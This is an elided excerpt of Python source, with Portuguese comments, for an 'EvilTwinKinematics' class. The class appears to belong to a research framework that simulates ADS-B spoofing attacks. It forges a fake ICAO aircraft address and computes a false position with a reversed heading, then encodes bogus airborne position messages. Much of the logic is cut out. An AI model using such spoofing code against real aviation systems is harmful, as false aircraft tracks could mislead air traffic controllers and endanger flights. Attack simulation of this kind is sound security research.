...
class EvilTwinKinematics(AbstractAttack):
    """
    Classe responsável pelo ataque de spoofing que altera a posição (LATITUDE, LONGITUDE E PROA)
    e o ENDEREÇO ICAO da aeronave. As outras informações são exatamente as mesmas.
    ...
    def __init__(self):
        ...
        Construtor
        """
        M_LOG.info(">> EvilTwinKinematics.__init__")
        ...
        self.__f_lat = -15.8719444444

        self.__f_lng = -48.0216666667
        #
    ...
    def __airborne_pos_threaded(self):
        ...
        while True:
            ...
            if (ldefs.LATITUDE and ldefs.LONGITUDE and ldefs.LAST_TYPE and ldefs.ALTITUDE) in self.__dct_aircraft:
                ...
                if (ldefs.GROUND_SPEED and ldefs.HEADING) in self.__dct_aircraft:
                    lf_ground_speed = self.__dct_aircraft[ldefs.GROUND_SPEED]
                    lf_heading = self.__dct_aircraft[ldefs.HEADING] + 180.0
                    lf_dx, lf_dy = self.calculate_kinematics(lf_ground_speed, lf_heading)
                    self.__f_lat += lf_dy
                    self.__f_lng += lf_dx

                # Hex
                ls_msg, ls_last_msg = self.encode_airborne_position(self.__s_fake_icao24, li_sv, self.__f_lat,
                                                       self.__f_lng, lf_altitude, self.__s_last_position_msg)
    ...
    def spy(self, fdct_aircraft_table=None, flst_icao24_fake=None):
        ...
        :return: None.
        """
        M_LOG.info(">> EvilTwinKinematics.spy")
    ...
    def calculate_kinematics(self, ff_ground_speed, ff_heading):
        ...
        :param ff_gorund_speed:
        :param ff_heading:
        :return:
        """
        ff_heading_radians = math.radians(ff_heading)
        ff_dx = (ff_ground_speed * ldefs.NM_H_TO_NM_S * 0.5 * math.sin(ff_heading_radians)) / 60.
        ff_dy = (ff_ground_speed * ldefs.NM_H_TO_NM_S * 0.5 * math.cos(ff_heading_radians)) / 60.
    ...
    def start(self, fi_time_to_attack, fi_interval_to_attack):
        ...
        :return:
        """
        super(EvilTwinKinematics, self).start(fi_time_to_attack, fi_interval_to_attack)
    ...
    def __str__(self):
        ...
        """
        return "CyberAttack::EvilTwinKinematics"
